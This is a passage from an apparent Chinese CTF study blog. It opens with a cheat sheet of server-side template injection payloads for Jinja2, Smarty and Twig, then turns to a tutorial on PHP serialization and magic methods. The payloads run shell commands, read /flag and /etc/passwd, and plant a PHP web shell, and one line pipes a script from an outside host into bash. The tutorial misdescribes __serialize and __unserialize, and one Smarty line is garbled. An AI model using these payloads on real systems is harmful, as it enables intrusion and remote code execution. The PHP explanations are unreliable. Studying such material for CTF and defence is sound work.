class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="思路四-：基本类型的某些方法属于特殊方法，可以通过链式调用"><a href="#思路四-：基本类型的某些方法属于特殊方法，可以通过链式调用" class="headerlink" title="思路四 ：基本类型的某些方法属于特殊方法，可以通过链式调用"></a><code>思路四 ：基本类型的某些方法属于特殊方法，可以通过链式调用</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].append.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;get_flashed_message(可替换任意xxx读文件绕过(cat绕过)).__init__.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">找 __builtins__再找__import__-&gt;[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><ul><li><code>__open__-&gt;[&#39;open&#39;](/flag).read()%20</code></li><li>&#96;&#96;.<strong>builtins</strong><a href="%22__import__('os'">‘eval’</a>.popen(‘cat &#x2F;flag’).read()”)}}&#96;</li></ul><p><code>==================================================================================================================================================================================================================================</code></p><h1 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><code>Smarty</code></h1><p><code>//&#123;php&#125;标签执行php代码</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;phplecho id ;l/php&#125;<br></code></pre></td></tr></table></figure><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a><code>Getshell</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;<br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;ls&#x27;)&#125;<br>&#123;if show_source (&#x27;/flag&#x27;)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a><code>反弹shell:</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;curl http://d.ylng.vip:12390/dev.txt|bash&#x27;)&#125;<br></code></pre></td></tr></table></figure><h1 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><code>Twig</code></h1><ul><li><code>使用&#123;&#123;_self.env.getFilter&#125;&#125;报错，可以判断是Twig(报错后需要清空浏览器记录在重新访问，title也提示了是cookie)。于是抓包修改cookie中的user值，利用一下payload直接执行命令</code><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;self&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//这两个一起的</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;id&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat\x20/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat$IFS/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web py</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-属性和权限"><a href="#PHP-属性和权限" class="headerlink" title="PHP 属性和权限"></a>PHP 属性和权限</h1><ul><li><p><strong>属性的权限，可以分为：</strong></p><ol><li><code>public</code> 权限 外部可以通过箭头访问到</li><li><code>private</code> 权限 内部通过 <code>$this-&gt;username</code> 访问到</li><li><code>protected</code> 权限 表示 自身及其子类 和父类 能够访问</li></ol></li><li><p><strong>抽象类</strong></p><ul><li>不能被 <code>new</code>，也就是不能被直接实例化对象</li></ul></li><li><p><strong>接口 <code>interface</code></strong></p><ul><li>为了实现多继承效果</li><li><code>implements</code> 可以实现多个接口</li></ul></li><li><p><strong>方法的属性修饰符</strong></p><ul><li><code>public</code></li><li><code>private</code></li><li><code>protected</code></li></ul></li><li><p><strong>修饰：</strong></p><ul><li>静态属性 <code>static</code></li><li><code>final</code> 属性 <code>final</code></li></ul></li></ul><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><ul><li>如果属性权限为 <code>private</code>，那么序列化后，存储的属性名字为 <code>%00+类名+%00+属性名</code></li><li>如果属性权限为 <code>protected</code>，那么序列化后，存储的属性名字为 <code>%00+*+%00+属性名</code></li><li>序列化是将一个对象变为一个可以传输的字符串 <code>serialize(对象)</code> 返回序列化后的字符串</li><li>反序列化就是将一个可以传输的字符串变为一个可以调用的对象 <code>unserialize(反序列化后的字符串)</code> 返回对象</li></ul><h3 id="反序列化示例："><a href="#反序列化示例：" class="headerlink" title="反序列化示例："></a>反序列化示例：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>反序列化时，PHP会做以下操作：</strong><ol><li>找到反序列化字符串规定的类名字 </li><li>实例化这个类，但不会调用构造方法</li><li>有了实例化的类对象，对它的属性进行赋值</li><li>执行魔术方法 <code>__wakeup()</code> 和 <code>__unserialize()</code></li><li>返回构造好的对象</li></ol></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$city</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zip</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$city</span>, <span class="hljs-variable">$zip</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;city = <span class="hljs-variable">$city</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;zip = <span class="hljs-variable">$zip</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$address</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phoneNumbers</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$address</span>, <span class="hljs-variable">$phoneNumbers</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;address = <span class="hljs-variable">$address</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;phoneNumbers = <span class="hljs-variable">$phoneNumbers</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$address</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">&quot;New York&quot;</span>, <span class="hljs-string">&quot;10001&quot;</span>);<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-variable">$address</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;123-456-7890&quot;</span>, <span class="hljs-string">&quot;098-765-4321&quot;</span>));<br><span class="hljs-variable">$serializedData</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedData</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>结果是：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>解读序列化字符串：</strong></p><ol><li><p><strong>识别外层对象：</strong></p><ul><li><code>O:4:&quot;User&quot;:3:</code></li><li><code>O</code> 表示对象（Object）。</li><li><code>4</code> 表示类名长度。</li><li><code>&quot;User&quot;</code> 是类名。</li><li><code>3</code> 表示对象的属性数量。</li></ul></li><li><p><strong>解析对象属性：</strong></p><ul><li><code>&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;s:12:&quot;phoneNumbers&quot;;a:2:&#123;i:0;s:12:&quot;123-456-7890&quot;;i:1;s:12:&quot;098-765-4321&quot;;&#125;&#125;</code></li><li>解析第一个属性：<ul><li><code>s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;</code></li></ul></li><li>解析第二个属性：<ul><li><code>s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code></li><li><code>s:7:&quot;address&quot;</code> 表示字符串属性名，长度为 7，内容是 “address”</li><li><code>O:7:&quot;Address&quot;:2:</code> 表示一个嵌套的 Address 对象</li><li><code>&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code> 包含了 Address 对象的属性。</li><li><code>s:4:&quot;city&quot;;s:8:&quot;New York&quot;;</code> 表示 Address 对象的第一个属性。</li><li><code>s:4:&quot;city&quot;</code> 表示字符串属性名，长度为 4，内容是 “city”。</li><li><code>s:8:&quot;New York&quot;</code> 表示字符串属性值，长度为 8，内容是 “New York”。</li><li><code>s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;</code> 表示 Address 对象的第二个属性。</li><li><code>s:3:&quot;zip&quot;</code> 表示字符串属性名，长度为 3，内容是 “zip”。</li><li><code>s:5:&quot;10001&quot;</code> 表示字符串属性值，长度为 5，内容是 “10001”。</li></ul></li></ul></li></ol></li><li><p><strong><code>$this</code>解释为当前对象里的：</strong></p><ul><li><code>__construct</code>：当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</li><li><code>__destruct</code>：当 PHP 脚本执行结束前一秒当一个对象被销毁前自动调用这个方法，可以用来释放对象占用的资源。</li><li><code>__call</code>：在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</li><li><code>__callStatic</code>：在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</li><li><code>__get</code>：当读取（<code>echo</code>）访问（<code>$myObject-&gt;age;</code>）一个不存在或不可访问的属性时，<code>__get</code> 方法会被自动调用。</li><li><code>__set</code>：当设置（赋值）一个不存在或不可访问的属性时，<code>__set</code> 方法会被自动调用。</li><li><code>__isset</code>：当使用 <code>isset()</code> 或 <code>empty()</code> 测试一个对象的属性是否存在时自动调用这个方法，可以用来实现属性的访问控制。</li><li><code>__unset</code>：当使用 <code>unset()</code> 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</li><li><code>__toString</code>：当一个对象被当做字符串时（<code>echo $myObject;</code>）（<code>preg_match</code>时）自动调用这个方法，可以用来实现对象的字符串表示。</li><li><code>__invoke</code>：当一个对象被作为函数调用<code>$myObject(&#39;ChatGPT&#39;);</code>自动调用这个方法，可以用来实现对象的可调用性。</li><li><code>__set_state</code>：当使用 <code>var_export()</code> 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</li><li><code>__clone</code>：当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</li><li><code>__debugInfo</code>：当使用 <code>var_dump()</code> 或 <code>print_r()</code> 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</li><li><code>__sleep</code>：在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</li><li><code>__wakeup</code>：在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</li><li><code>__unserialize()</code> 是 PHP 7.4 中引入的一个魔术方法，将对象序列化为数组，同时在序列化时对敏感数据（如密码）进行加密处理。在PHP7.4.0开始，如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法。</li><li><code>__serialize()</code> 方法：反序列化时，从数组中恢复对象状态，并对敏感数据（如密码）进行解密处理。使用 <code>serialize()</code> 将对象序列化为字符串时，<code>__serialize()</code> 方法被调用，并将属性打包为数组。</li></ul></li></ul><hr><h3 id="这里是被调用的例子"><a href="#这里是被调用的例子" class="headerlink" title="这里是被调用的例子"></a>这里是被调用的例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br><br>    <span class="hljs-comment">// __set() 方法在给不存在的属性赋值时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;设置属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 为 &#x27;<span class="hljs-subst">$value</span>&#x27;。&quot;</span> . PHP_EOL;      <span class="hljs-comment">//设置属性 &#x27;name&#x27; 为 &#x27;ChatGPT&#x27;。</span><br>        <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// __get() 方法在访问不存在的属性时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;data)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;访问属性 &#x27;<span class="hljs-subst">$name</span>&#x27;，值为：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] . PHP_EOL;    <span class="hljs-comment">//访问属性 &#x27;name&#x27;，值为：ChatGPT</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br>&#125;<br><br><span class="hljs-comment">// __unset() 方法，用于删除属性</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>])) &#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 已被删除。&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;对象的名称是：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br><span class="hljs-comment">// __invoke() 方法会在对象被当作函数调用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;message . <span class="hljs-string">&quot;, &quot;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br><span class="hljs-comment">// __sleep() 方法在对象序列化之前调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 仅返回需要序列化的属性</span><br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&#x27;name&#x27;</span>];<br>    &#125;<br><span class="hljs-comment">// __wakeup() 方法在对象反序列化之后调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 重新初始化或恢复对象的状态</span><br>        <span class="hljs-variable language_">$this</span>-&gt;sessionData = <span class="hljs-string">&quot;Session data restored&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">// 创建类的实例</span><br><span class="hljs-variable">$myObject</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-comment">// 设置不存在的属性</span><br><span class="hljs-variable">$myObject</span>-&gt;name = <span class="hljs-string">&#x27;ChatGPT&#x27;</span>;<br><span class="hljs-comment">// 访问不存在的属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;name . PHP_EOL;<br><span class="hljs-variable">$nonExistent</span> = <span class="hljs-variable">$myObject</span>-&gt;age;<br><span class="hljs-comment">// 访问未设置的属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;age . PHP_EOL;<br><span class="hljs-comment">// 使用 isset() 检查属性是否存在</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$myObject</span>-&gt;name)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;name&#x27; 存在。&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;name&#x27; 不存在。&quot;</span> . PHP_EOL;<br>&#125;<br><span class="hljs-comment">// 删除属性</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$myObject</span>-&gt;name);<br><span class="hljs-comment">// 直接输出对象，自动调用 __toString()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>;<br><span class="hljs-comment">// 直接调用对象，自动调用 __invoke()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>(<span class="hljs-string">&#x27;ChatGPT&#x27;</span>);<br><span class="hljs-comment">// 序列化对象__sleep() 方法返回一个包含 &#x27;name&#x27; 的数组，表示只有 name 